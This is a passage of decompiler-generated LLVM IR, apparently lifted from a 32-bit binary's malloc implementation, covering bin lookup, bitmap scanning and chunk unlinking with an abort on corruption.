  %v12_8052186 = icmp eq i32 %v0_805223c111, %v1_8052186
  %v1_805218c = icmp eq i1 %v12_8052186, false
  br i1 %v1_805218c, label %dec_label_pc_805219d, label %dec_label_pc_805218e

dec_label_pc_805218e:                             ; preds = %dec_label_pc_8052186
  store i32 %v1_8052192, i32* %eax.global-to-local, align 4
  %v6_8052197 = icmp ugt i32 %v1_8052171, %v1_8052192
  br i1 %v6_8052197, label %dec_label_pc_805274e, label %dec_label_pc_805219d

dec_label_pc_805219d:                             ; preds = %dec_label_pc_805218e, %dec_label_pc_8052186, %dec_label_pc_805217e, %dec_label_pc_805216b
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %eax.global-to-local, align 4
  %v2_80521a2 = add i32 %v3_805216e, 8
  %v3_80521a2 = inttoptr i32 %v2_80521a2 to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v3_80521a2, align 4
  %v0_80521a5 = load i32, i32* @edx, align 4
  store i32 %v0_80521a5, i32* @global_var_80678e0.735, align 4
  %v0_80521a8 = load i32, i32* @edi, align 4
  %v15_80521a8 = icmp eq i32 %v0_80521a8, %v1_805244e
  br i1 %v15_80521a8, label %dec_label_pc_805278f, label %dec_label_pc_80521b2

dec_label_pc_80521b2:                             ; preds = %dec_label_pc_805219d
  %v6_80521b8 = icmp ugt i32 %v0_80521a8, 255
  br i1 %v6_80521b8, label %dec_label_pc_80521cb, label %dec_label_pc_80521ba

dec_label_pc_80521ba:                             ; preds = %dec_label_pc_80521b2
  %v2_80521bc = udiv i32 %v0_80521a8, 8
  store i32 %v2_80521bc, i32* %esi.global-to-local, align 4
  %v1_80521bf = mul nuw i32 %v2_80521bc, 8
  %v2_80521bf = add i32 %v1_80521bf, 134641868
  store i32 %v2_80521bf, i32* @ebx, align 4
  %v1_80521c6 = add i32 %v1_80521bf, 134641876
  %v2_80521c6 = inttoptr i32 %v1_80521c6 to i32*
  %v3_80521c6 = load i32, i32* %v2_80521c6, align 4
  store i32 %v3_80521c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052214

dec_label_pc_80521cb:                             ; preds = %dec_label_pc_80521b2
  store i32 %v0_80521a8, i32* @eax, align 4
  %v0_80521cd = call i32 @__malloc_largebin_index()
  store i32 %v0_80521cd, i32* %esi.global-to-local, align 4
  %v1_80521d4 = mul i32 %v0_80521cd, 8
  %v2_80521d4 = add i32 %v1_80521d4, ptrtoint (i32* @global_var_80678cc.732 to i32)
  store i32 %v2_80521d4, i32* %eax.global-to-local, align 4
  %v1_80521db = add i32 %v1_80521d4, add (i32 ptrtoint (i32* @global_var_80678cc.732 to i32), i32 8)
  %v2_80521db = inttoptr i32 %v1_80521db to i32*
  %v3_80521db = load i32, i32* %v2_80521db, align 4
  store i32 %v3_80521db, i32* %edx.global-to-local, align 4
  store i32 %v3_80521db, i32* @ebx, align 4
  %v12_80521e4 = icmp eq i32 %v3_80521db, %v2_80521d4
  br i1 %v12_80521e4, label %dec_label_pc_8052214, label %dec_label_pc_80521e8

dec_label_pc_80521e8:                             ; preds = %dec_label_pc_80521cb
  %v1_80521e8 = add i32 %v1_80521d4, add (i32 ptrtoint (i32* @global_var_80678cc.732 to i32), i32 12)
  %v2_80521e8 = inttoptr i32 %v1_80521e8 to i32*
  %v3_80521e8 = load i32, i32* %v2_80521e8, align 4
  store i32 %v3_80521e8, i32* @ebx, align 4
  %v0_80521eb = load i32, i32* @edi, align 4
  %v2_80521eb = add i32 %v3_80521e8, 4
  %v3_80521eb = inttoptr i32 %v2_80521eb to i32*
  %v4_80521eb = load i32, i32* %v3_80521eb, align 4
  %v10_80521eb = icmp ult i32 %v0_80521eb, %v4_80521eb
  %v1_80521ee = icmp eq i1 %v10_80521eb, false
  br i1 %v1_80521ee, label %dec_label_pc_80521f6, label %dec_label_pc_8052214

dec_label_pc_80521f6:                             ; preds = %dec_label_pc_80521e8
  %v1_80521f8 = or i32 %v0_80521eb, 1
  store i32 %v1_80521f8, i32* %eax.global-to-local, align 4
  store i32 %v3_80521db, i32* %ebx.global-to-local, align 4
  %v2_805220c101 = add i32 %v3_80521db, 4
  %v3_805220c102 = inttoptr i32 %v2_805220c101 to i32*
  %v4_805220c103 = load i32, i32* %v3_805220c102, align 4
  %v10_805220c104 = icmp ult i32 %v1_80521f8, %v4_805220c103
  br i1 %v10_805220c104, label %dec_label_pc_80521fd, label %dec_label_pc_8052211

dec_label_pc_80521fd:                             ; preds = %dec_label_pc_80521f6, %dec_label_pc_80521fd
  %v0_8052211105 = phi i32 [ %v3_8052201, %dec_label_pc_80521fd ], [ %v3_80521db, %dec_label_pc_80521f6 ]
  store i32 %v0_8052211105, i32* %ecx.global-to-local, align 4
  %v1_8052201 = add i32 %v0_8052211105, 8
  %v2_8052201 = inttoptr i32 %v1_8052201 to i32*
  %v3_8052201 = load i32, i32* %v2_8052201, align 4
  store i32 %v3_8052201, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052201, i32* %ebx.global-to-local, align 4
  %v2_805220c = add i32 %v3_8052201, 4
  %v3_805220c = inttoptr i32 %v2_805220c to i32*
  %v4_805220c = load i32, i32* %v3_805220c, align 4
  %v10_805220c = icmp ult i32 %v1_80521f8, %v4_805220c
  br i1 %v10_805220c, label %dec_label_pc_80521fd, label %dec_label_pc_8052211

dec_label_pc_8052211:                             ; preds = %dec_label_pc_80521fd, %dec_label_pc_80521f6
  %v0_8052211.lcssa = phi i32 [ %v3_80521db, %dec_label_pc_80521f6 ], [ %v3_8052201, %dec_label_pc_80521fd ]
  %v1_8052211 = add i32 %v0_8052211.lcssa, 12
  %v2_8052211 = inttoptr i32 %v1_8052211 to i32*
  %v3_8052211 = load i32, i32* %v2_8052211, align 4
  store i32 %v3_8052211, i32* @ebx, align 4
  br label %dec_label_pc_8052214

dec_label_pc_8052214:                             ; preds = %dec_label_pc_80521ba, %dec_label_pc_80521e8, %dec_label_pc_80521cb, %dec_label_pc_8052211
  %v0_8052214 = phi i32 [ %v0_80521cd, %dec_label_pc_80521cb ], [ %v0_80521cd, %dec_label_pc_8052211 ], [ %v0_80521cd, %dec_label_pc_80521e8 ], [ %v2_80521bc, %dec_label_pc_80521ba ]
  %stack_var_-64.1 = phi i32 [ %v2_80521d4, %dec_label_pc_80521cb ], [ %v0_8052211.lcssa, %dec_label_pc_8052211 ], [ %v2_80521d4, %dec_label_pc_80521e8 ], [ %v3_80521c6, %dec_label_pc_80521ba ]
  %v1_8052216 = urem i32 %v0_8052214, 32
  %v2_8052216 = icmp eq i32 %v1_8052216, 0
  store i32 %v1_8052216, i32* %esi.global-to-local, align 4
  store i32 %v1_8052216, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052220 = sdiv i32 %v0_8052214, 32
  store i32 %v2_8052220, i32* %edx.global-to-local, align 4
  br i1 %v2_8052216, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_8052214
  %v5_8052223 = shl i32 1, %v1_8052216
  store i32 %v5_8052223, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_8052214, %bb
  %v5_8052225 = phi i32 [ 1, %dec_label_pc_8052214 ], [ %v5_8052223, %bb ]
  %v1_8052225 = mul nsw i32 %v2_8052220, 4
  %v2_8052225 = add i32 %v1_8052225, ptrtoint (i32* @global_var_8067bd4.736 to i32)
  %v3_8052225 = inttoptr i32 %v2_8052225 to i32*
  %v4_8052225 = load i32, i32* %v3_8052225, align 4
  %v6_8052225 = or i32 %v4_8052225, %v5_8052225
  store i32 %v6_8052225, i32* %v3_8052225, align 4
  %v0_805222c = load i32, i32* @ebx, align 4
  %v1_805222c = load i32, i32* @ebp, align 4
  %v2_805222c = add i32 %v1_805222c, 12
  %v3_805222c = inttoptr i32 %v2_805222c to i32*
  store i32 %v0_805222c, i32* %v3_805222c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052233 = load i32, i32* @ebp, align 4
  %v2_8052233 = add i32 %v1_8052233, 8
  %v3_8052233 = inttoptr i32 %v2_8052233 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052233, align 4
  %v0_8052236 = load i32, i32* @ebp, align 4
  %v1_8052236 = load i32, i32* @ebx, align 4
  %v2_8052236 = add i32 %v1_8052236, 8
  %v3_8052236 = inttoptr i32 %v2_8052236 to i32*
  store i32 %v0_8052236, i32* %v3_8052236, align 4
  %v0_8052239 = load i32, i32* @ebp, align 4
  %v1_8052239 = load i32, i32* @esi, align 4
  %v2_8052239 = add i32 %v1_8052239, 12
  %v3_8052239 = inttoptr i32 %v2_8052239 to i32*
  store i32 %v0_8052239, i32* %v3_8052239, align 4
  %v0_805223c = load i32, i32* @global_var_80678e0.735, align 32
  store i32 %v0_805223c, i32* @ebp, align 4
  %v9_8052242 = icmp eq i32 %v0_805223c, 134641876
  %v1_8052248 = icmp eq i1 %v9_8052242, false
  br i1 %v1_8052248, label %dec_label_pc_805216b, label %dec_label_pc_805224e

dec_label_pc_805224e:                             ; preds = %bb84, %dec_label_pc_805223c.preheader
  br i1 %v8_80520ff, label %dec_label_pc_80522dc, label %dec_label_pc_805225c

dec_label_pc_805225c:                             ; preds = %dec_label_pc_805224e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052260 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052260 = add i32 %v1_8052260, ptrtoint (i32* @global_var_80678cc.732 to i32)
  store i32 %v2_8052260, i32* %edx.global-to-local, align 4
  %v1_8052267 = add i32 %v1_8052260, add (i32 ptrtoint (i32* @global_var_80678cc.732 to i32), i32 12)
  %v2_8052267 = inttoptr i32 %v1_8052267 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052267, align 4
  br label %dec_label_pc_80522d8

dec_label_pc_805226c:                             ; preds = %dec_label_pc_80522d8
  %v1_805226c = add i32 %v4_8052283, 4
  %v2_805226c = inttoptr i32 %v1_805226c to i32*
  %v3_805226c = load i32, i32* %v2_805226c, align 4
  store i32 %v3_805226c, i32* %ebx.global-to-local, align 4
  %v1_805226f = add i32 %v4_8052283, 12
  %v2_805226f = inttoptr i32 %v1_805226f to i32*
  %v3_805226f = load i32, i32* %v2_805226f, align 4
  store i32 %v3_805226f, i32* @ecx, align 4
  %v1_8052272 = and i32 %v3_805226c, -4
  store i32 %v1_8052272, i32* @ebx, align 4
  %v10_8052275 = icmp ult i32 %v1_8052272, %v1_805244e
  br i1 %v10_8052275, label %dec_label_pc_80522d8, label %dec_label_pc_805227b

dec_label_pc_805227b:                             ; preds = %dec_label_pc_805226c
  %v1_805227b = add i32 %v4_8052283, 8
  %v2_805227b = inttoptr i32 %v1_805227b to i32*
  %v3_805227b = load i32, i32* %v2_805227b, align 4
  store i32 %v3_805227b, i32* @edx, align 4
  %v1_805227e = add i32 %v3_805227b, 12
  %v2_805227e = inttoptr i32 %v1_805227e to i32*
  %v3_805227e = load i32, i32* %v2_805227e, align 4
  %v15_805227e = icmp eq i32 %v3_805227e, %v4_8052283
  %v1_8052281 = icmp eq i1 %v15_805227e, false
  br i1 %v1_8052281, label %dec_label_pc_8052288, label %dec_label_pc_8052283

dec_label_pc_8052283:                             ; preds = %dec_label_pc_805227b
  %v1_8052283 = add i32 %v3_805226f, 8
  %v2_8052283 = inttoptr i32 %v1_8052283 to i32*
  %v3_8052283 = load i32, i32* %v2_8052283, align 4
  %v15_8052283 = icmp eq i32 %v3_8052283, %v4_8052283
  br i1 %v15_8052283, label %dec_label_pc_805228d, label %dec_label_pc_8052288

dec_label_pc_8052288:                             ; preds = %dec_label_pc_8052283, %dec_label_pc_805227b
  %v0_8052288 = call i32 @abort()
  store i32 %v0_8052288, i32* %eax.global-to-local, align 4
  %v0_805228d.pre = load i32, i32* @ebx, align 4
  %v0_8052293.pre = load i32, i32* @ecx, align 4
  %v1_8052293.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805228d

dec_label_pc_805228d:                             ; preds = %dec_label_pc_8052283, %dec_label_pc_8052288
  %v1_8052293 = phi i32 [ %v3_805227b, %dec_label_pc_8052283 ], [ %v1_8052293.pre, %dec_label_pc_8052288 ]
  %v0_8052293 = phi i32 [ %v3_805226f, %dec_label_pc_8052283 ], [ %v0_8052293.pre, %dec_label_pc_8052288 ]
  %v0_805228d = phi i32 [ %v1_8052272, %dec_label_pc_8052283 ], [ %v0_805228d.pre, %dec_label_pc_8052288 ]
  %v5_805228f = sub i32 %v0_805228d, %v1_805244e
  store i32 %v5_805228f, i32* %esi.global-to-local, align 4
  %v2_8052293 = add i32 %v1_8052293, 12
  %v3_8052293 = inttoptr i32 %v2_8052293 to i32*
  store i32 %v0_8052293, i32* %v3_8052293, align 4
  %v0_8052296 = load i32, i32* @edx, align 4
  %v1_8052296 = load i32, i32* @ecx, align 4
  %v2_8052296 = add i32 %v1_8052296, 8
  %v3_8052296 = inttoptr i32 %v2_8052296 to i32*
  store i32 %v0_8052296, i32* %v3_8052296, align 4
  %v0_8052299 = load i32, i32* %esi.global-to-local, align 4
  %v0_805229c = load i32, i32* %eax.global-to-local, align 4
  %v1_805229c = add i32 %v0_805229c, 8
  store i32 %v1_805229c, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_8052299, 16
  br i1 %tmp127, label %dec_label_pc_805279d, label %dec_label_pc_80522a5

dec_label_pc_80522a5:                             ; preds = %dec_label_pc_805228d
  %v2_80522a9 = add i32 %v0_805229c, %v1_805244e
  store i32 %v2_80522a9, i32* @edx, align 4
  %v1_80522ac = or i32 %v1_805244e, 1
  store i32 %v1_80522ac, i32* %ebx.global-to-local, align 4
  %v2_80522af = add i32 %v0_805229c, 4
  %v3_80522af = inttoptr i32 %v2_80522af to i32*
  store i32 %v1_80522ac, i32* %v3_80522af, align 4
  %v0_80522b2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522b4 = or i32 %v0_80522b2, 1
  store i32 %v1_80522b4, i32* %eax.global-to-local, align 4
  %v0_80522b7 = load i32, i32* @edx, align 4
  %v1_80522b7 = load i32, i32* @ebp, align 4
  %v2_80522b7 = add i32 %v1_80522b7, 8
  %v3_80522b7 = inttoptr i32 %v2_80522b7 to i32*
  store i32 %v0_80522b7, i32* %v3_80522b7, align 4
  %v0_80522ba = load i32, i32* @edx, align 4
  %v1_80522ba = load i32, i32* @ebp, align 4
  %v2_80522ba = add i32 %v1_80522ba, 12
  %v3_80522ba = inttoptr i32 %v2_80522ba to i32*
  store i32 %v0_80522ba, i32* %v3_80522ba, align 4
  %v0_80522bd = load i32, i32* @edx, align 4
  %v1_80522bd = add i32 %v0_80522bd, 8
  %v2_80522bd = inttoptr i32 %v1_80522bd to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v2_80522bd, align 4
  %v0_80522c4 = load i32, i32* @edx, align 4
  %v1_80522c4 = add i32 %v0_80522c4, 12
  %v2_80522c4 = inttoptr i32 %v1_80522c4 to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v2_80522c4, align 4
  %v0_80522cb = load i32, i32* %eax.global-to-local, align 4
  %v1_80522cb = load i32, i32* @edx, align 4
  %v2_80522cb = add i32 %v1_80522cb, 4
  %v3_80522cb = inttoptr i32 %v2_80522cb to i32*
  store i32 %v0_80522cb, i32* %v3_80522cb, align 4
  %v0_80522ce = load i32, i32* %esi.global-to-local, align 4
  %v1_80522ce = load i32, i32* @edx, align 4
  %v3_80522ce = add i32 %v1_80522ce, %v0_80522ce
  %v4_80522ce = inttoptr i32 %v3_80522ce to i32*
  store i32 %v0_80522ce, i32* %v4_80522ce, align 4
  br label %dec_label_pc_80527a2

dec_label_pc_80522d8:                             ; preds = %dec_label_pc_805226c, %dec_label_pc_805225c
  %v4_8052283 = phi i32 [ %storemerge1.pre, %dec_label_pc_805225c ], [ %v3_805226f, %dec_label_pc_805226c ]
  store i32 %v4_8052283, i32* %eax.global-to-local, align 4
  %v12_80522d8 = icmp eq i32 %v4_8052283, %v2_8052260
  %v1_80522da = icmp eq i1 %v12_80522d8, false
  br i1 %v1_80522da, label %dec_label_pc_805226c, label %dec_label_pc_80522dc.loopexit

dec_label_pc_80522dc.loopexit:                    ; preds = %dec_label_pc_80522d8
  br label %dec_label_pc_80522dc

dec_label_pc_80522dc:                             ; preds = %dec_label_pc_80522dc.loopexit, %dec_label_pc_805224e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80522e5 = add i32 %stack_var_-40.0.ph, 1
  %v2_80522e8 = udiv i32 %v1_80522e5, 32
  store i32 %v2_80522e8, i32* @edi, align 4
  %v1_80522eb = mul i32 %v1_80522e5, 8
  %v2_80522eb = add i32 %v1_80522eb, ptrtoint (i32* @global_var_80678cc.732 to i32)
  store i32 %v2_80522eb, i32* %ebx.global-to-local, align 4
  %v1_80522f2 = urem i32 %v1_80522e5, 32
  %v2_80522f2 = icmp eq i32 %v1_80522f2, 0
  store i32 %v1_80522f2, i32* %ecx.global-to-local, align 4
  %v1_80522f5 = mul nuw nsw i32 %v2_80522e8, 4
  %v2_80522f5 = add i32 %v1_80522f5, ptrtoint (i32* @global_var_8067bd4.736 to i32)
  %v3_80522f5 = inttoptr i32 %v2_80522f5 to i32*
  %v4_80522f5 = load i32, i32* %v3_80522f5, align 4
  store i32 %v4_80522f5, i32* %edx.global-to-local, align 4
  br i1 %v2_80522f2, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_80522dc
  %v5_80522fc = shl i32 1, %v1_80522f2
  store i32 %v5_80522fc, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80522dc, %bb85, %dec_label_pc_805233d
  %v1_80522fe = phi i32 [ %v1_80522fe.pre, %dec_label_pc_805233d ], [ %v4_80522f5, %bb85 ], [ %v4_80522f5, %dec_label_pc_80522dc ]
  %v0_8052302 = phi i32 [ %v0_80522fe.pre, %dec_label_pc_805233d ], [ %v5_80522fc, %bb85 ], [ 1, %dec_label_pc_80522dc ]
  %tmp86 = icmp ule i32 %v0_8052302, %v1_80522fe
  %v1_8052302 = icmp eq i32 %v0_8052302, 0
  %v1_8052304 = icmp eq i1 %v1_8052302, false
  %or.cond = and i1 %tmp86, %v1_8052304
  br i1 %or.cond, label %dec_label_pc_8052302.dec_label_pc_8052332.preheader_crit_edge, label %dec_label_pc_8052306.preheader

dec_label_pc_8052302.dec_label_pc_8052332.preheader_crit_edge: ; preds = %.preheader
  %v0_805232d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052332.preheader

dec_label_pc_8052306.preheader:                   ; preds = %.preheader
  %v0_8052306.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052306

dec_label_pc_8052306:                             ; preds = %dec_label_pc_8052306.preheader, %dec_label_pc_8052310
  %v0_8052306 = phi i32 [ %v0_8052306.pre, %dec_label_pc_8052306.preheader ], [ %v1_8052306, %dec_label_pc_8052310 ]
  %v1_8052306 = add i32 %v0_8052306, 1
  store i32 %v1_8052306, i32* @edi, align 4
  %v6_805230a = icmp ugt i32 %v1_8052306, 2
  br i1 %v6_805230a, label %dec_label_pc_80523b9.loopexit, label %dec_label_pc_8052310

dec_label_pc_8052310:                             ; preds = %dec_label_pc_8052306
  %v1_8052310 = mul i32 %v1_8052306, 4
  %v2_8052310 = add i32 %v1_8052310, ptrtoint (i32* @global_var_8067bd4.736 to i32)
  %v3_8052310 = inttoptr i32 %v2_8052310 to i32*
  %v4_8052310 = load i32, i32* %v3_8052310, align 4
  store i32 %v4_8052310, i32* %edx.global-to-local, align 4
  %v1_8052317 = icmp eq i32 %v4_8052310, 0
  br i1 %v1_8052317, label %dec_label_pc_8052306, label %dec_label_pc_805231b

dec_label_pc_805231b:                             ; preds = %dec_label_pc_8052310
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052322 = mul i32 %v1_8052306, 256
  store i32 %v2_8052322, i32* %eax.global-to-local, align 4
  %v1_8052325 = add i32 %v2_8052322, ptrtoint (i32* @global_var_80678cc.732 to i32)
  store i32 %v1_8052325, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052332.preheader

dec_label_pc_8052332.preheader:                   ; preds = %dec_label_pc_8052302.dec_label_pc_8052332.preheader_crit_edge, %dec_label_pc_805231b
  %v0_805232d12 = phi i32 [ %v1_8052325, %dec_label_pc_805231b ], [ %v0_805232d12.pre, %dec_label_pc_8052302.dec_label_pc_8052332.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805231b ], [ %v0_8052302, %dec_label_pc_8052302.dec_label_pc_8052332.preheader_crit_edge ]
  %v0_8052344 = phi i32 [ %v4_8052310, %dec_label_pc_805231b ], [ %v1_80522fe, %dec_label_pc_8052302.dec_label_pc_8052332.preheader_crit_edge ]
  %v2_80523324 = and i32 %v0_8052344, %esi.promoted
  %v3_80523325 = icmp eq i32 %v2_80523324, 0
  br i1 %v3_80523325, label %dec_label_pc_805232d, label %dec_label_pc_8052336

dec_label_pc_805232d:                             ; preds = %dec_label_pc_8052332.preheader, %dec_label_pc_805232d
  %v2_805233014 = phi i32 [ %v2_8052330, %dec_label_pc_805232d ], [ %esi.promoted, %dec_label_pc_8052332.preheader ]
  %v0_805232d13 = phi i32 [ %v1_805232d, %dec_label_pc_805232d ], [ %v0_805232d12, %dec_label_pc_8052332.preheader ]
  %v1_805232d = add i32 %v0_805232d13, 8
  %v2_8052330 = mul i32 %v2_805233014, 2
  %v2_8052332 = and i32 %v2_8052330, %v0_8052344
  %v3_8052332 = icmp eq i32 %v2_8052332, 0
  br i1 %v3_8052332, label %dec_label_pc_805232d, label %dec_label_pc_8052332.dec_label_pc_8052336_crit_edge

dec_label_pc_8052332.dec_label_pc_8052336_crit_edge: ; preds = %dec_label_pc_805232d
  store i32 %v1_805232d, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052330, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052336

dec_label_pc_8052336:                             ; preds = %dec_label_pc_8052332.dec_label_pc_8052336_crit_edge, %dec_label_pc_8052332.preheader
  %v0_8052346 = phi i32 [ %v2_8052330, %dec_label_pc_8052332.dec_label_pc_8052336_crit_edge ], [ %esi.promoted, %dec_label_pc_8052332.preheader ]
  %v1_8052360 = phi i32 [ %v1_805232d, %dec_label_pc_8052332.dec_label_pc_8052336_crit_edge ], [ %v0_805232d12, %dec_label_pc_8052332.preheader ]
  %v1_8052336 = add i32 %v1_8052360, 12
  %v2_8052336 = inttoptr i32 %v1_8052336 to i32*
  %v3_8052336 = load i32, i32* %v2_8052336, align 4
  store i32 %v3_8052336, i32* @ecx, align 4
  %v12_8052339 = icmp eq i32 %v3_8052336, %v1_8052360
  %v1_805233b = icmp eq i1 %v12_8052339, false
  br i1 %v1_805233b, label %dec_label_pc_8052351, label %dec_label_pc_805233d

dec_label_pc_805233d:                             ; preds = %dec_label_pc_8052336
  %v1_805233f = add i32 %v3_8052336, 8
  store i32 %v1_805233f, i32* %ebx.global-to-local, align 4
  %v1_8052342 = sub i32 -1, %v0_8052346
  store i32 %v1_8052342, i32* %eax.global-to-local, align 4
  %v2_8052344 = and i32 %v0_8052344, %v1_8052342
  store i32 %v2_8052344, i32* %edx.global-to-local, align 4
  %v2_8052346 = mul i32 %v0_8052346, 2
  store i32 %v2_8052346, i32* %esi.global-to-local, align 4
  %v1_8052348 = load i32, i32* @edi, align 4
  %v2_8052348 = mul i32 %v1_8052348, 4
  %v3_8052348 = add i32 %v2_8052348, ptrtoint (i32* @global_var_8067bd4.736 to i32)
  %v4_8052348 = inttoptr i32 %v3_8052348 to i32*
  store i32 %v2_8052344, i32* %v4_8052348, align 4
  %v0_80522fe.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80522fe.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052351:                             ; preds = %dec_label_pc_8052336
  %v1_8052351 = add i32 %v3_8052336, 4
  %v2_8052351 = inttoptr i32 %v1_8052351 to i32*
  %v3_8052351 = load i32, i32* %v2_8052351, align 4
  store i32 %v3_8052351, i32* %edx.global-to-local, align 4
  %v1_8052354 = add i32 %v3_8052336, 12
  %v2_8052354 = inttoptr i32 %v1_8052354 to i32*
  %v3_8052354 = load i32, i32* %v2_8052354, align 4
  store i32 %v3_8052354, i32* %eax.global-to-local, align 4
  %v1_8052357 = and i32 %v3_8052351, -4
  store i32 %v1_8052357, i32* @edx, align 4
  %v5_805235c = sub i32 %v1_8052357, %v1_805244e
  store i32 %v5_805235c, i32* %esi.global-to-local, align 4
  store i32 %v3_8052354, i32* %v2_8052336, align 4
  %v0_8052363 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052363 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052363 = add i32 %v1_8052363, 8
  %v3_8052363 = inttoptr i32 %v2_8052363 to i32*
  store i32 %v0_8052363, i32* %v3_8052363, align 4
  %v0_8052366 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_8052366, 16
  br i1 %tmp128, label %dec_label_pc_805236b, label %dec_label_pc_8052372

dec_label_pc_805236b:                             ; preds = %dec_label_pc_8052351
  %v0_805236b = load i32, i32* @ecx, align 4
  %v1_805236b = load i32, i32* @edx, align 4
  %v2_805236b = add i32 %v0_805236b, 4
  %v3_805236b = add i32 %v2_805236b, %v1_805236b
  %v4_805236b = inttoptr i32 %v3_805236b to i32*
  %v5_805236b = load i32, i32* %v4_805236b, align 4
  %v6_805236b = or i32 %v5_805236b, 1
  store i32 %v6_805236b, i32* %v4_805236b, align 4
  br label %dec_label_pc_80523b1

dec_label_pc_8052372:                             ; preds = %dec_label_pc_8052351
  store i32 %v1_805244e, i32* %eax.global-to-local, align 4
  %v0_805237b = load i32, i32* @ecx, align 4
  %v2_805237b = add i32 %v0_805237b, %v1_805244e
  store i32 %v2_805237b, i32* @edx, align 4
  %v1_805237e = load i32, i32* @ebp, align 4
  %v2_805237e = add i32 %v1_805237e, 8
  %v3_805237e = inttoptr i32 %v2_805237e to i32*
  store i32 %v2_805237b, i32* %v3_805237e, align 4
  %v0_8052381 = load i32, i32* @edx, align 4
  %v1_8052381 = load i32, i32* @ebp, align 4
  %v2_8052381 = add i32 %v1_8052381, 12
  %v3_8052381 = inttoptr i32 %v2_8052381 to i32*
  store i32 %v0_8052381, i32* %v3_8052381, align 4
  %v0_8052384 = load i32, i32* @edx, align 4
  %v1_8052384 = add i32 %v0_8052384, 8
  %v2_8052384 = inttoptr i32 %v1_8052384 to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v2_8052384, align 4
  %v0_805238b = load i32, i32* @edx, align 4
  %v1_805238b = add i32 %v0_805238b, 12
  %v2_805238b = inttoptr i32 %v1_805238b to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v2_805238b, align 4
  br i1 %v6_8052107, label %dec_label_pc_805239a, label %dec_label_pc_8052394

dec_label_pc_8052394:                             ; preds = %dec_label_pc_8052372
  %v0_8052394 = load i32, i32* @edx, align 4
  store i32 %v0_8052394, i32* @global_var_80678d0.733, align 16
  br label %dec_label_pc_805239a

dec_label_pc_805239a:                             ; preds = %dec_label_pc_8052372, %dec_label_pc_8052394
  %v4_805239a = or i32 %v1_805244e, 1
  %v0_805239f = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805239a, i32* %ebx.global-to-local, align 4
  %v1_80523a5 = or i32 %v0_805239f, 1
  store i32 %v1_80523a5, i32* %eax.global-to-local, align 4
  %v1_80523a8 = load i32, i32* @ecx, align 4
  %v2_80523a8 = add i32 %v1_80523a8, 4
  %v3_80523a8 = inttoptr i32 %v2_80523a8 to i32*
  store i32 %v4_805239a, i32* %v3_80523a8, align 4
  %v0_80523ab = load i32, i32* %esi.global-to-local, align 4
  %v1_80523ab = load i32, i32* @edx, align 4
  %v3_80523ab = add i32 %v1_80523ab, %v0_80523ab
  %v4_80523ab = inttoptr i32 %v3_80523ab to i32*
  store i32 %v0_80523ab, i32* %v4_80523ab, align 4
  %v0_80523ae = load i32, i32* %eax.global-to-local, align 4
  %v1_80523ae = load i32, i32* @edx, align 4
  %v2_80523ae = add i32 %v1_80523ae, 4
  %v3_80523ae = inttoptr i32 %v2_80523ae to i32*
  store i32 %v0_80523ae, i32* %v3_80523ae, align 4
  br label %dec_label_pc_80523b1

dec_label_pc_80523b1:                             ; preds = %dec_label_pc_805236b, %dec_label_pc_805239a
  %v0_80523b1 = load i32, i32* @ecx, align 4
  %v1_80523b1 = add i32 %v0_80523b1, 8
  store i32 %v1_80523b1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_80523b9.loopexit:                    ; preds = %dec_label_pc_8052306
  br label %dec_label_pc_80523b9

dec_label_pc_80523b9:                             ; preds = %dec_label_pc_80523b9.loopexit, %dec_label_pc_80520c1, %dec_label_pc_80520c9
  %v0_80523b9 = load i32, i32* @global_var_80678cc.732, align 4
  store i32 %v0_80523b9, i32* @ebx, align 4
  %v1_80523c3 = add i32 %v1_805244e, 16
  store i32 %v1_80523c3, i32* @esi, align 4
  %v1_80523c6 = add i32 %v0_80523b9, 4
  %v2_80523c6 = inttoptr i32 %v1_80523c6 to i32*
  %v3_80523c6 = load i32, i32* %v2_80523c6, align 4
  %v1_80523cd = and i32 %v3_80523c6, -4
  store i32 %v1_80523cd, i32* %ecx.global-to-local, align 4
  %v7_80523d0 = icmp ult i32 %v1_80523cd, %v1_80523c3
  br i1 %v7_80523d0, label %dec_label_pc_80523f0, label %dec_label_pc_80523d4

dec_label_pc_80523d4:                             ; preds = %dec_label_pc_80523b9
  %v2_80523d8 = add i32 %v0_80523b9, %v1_805244e
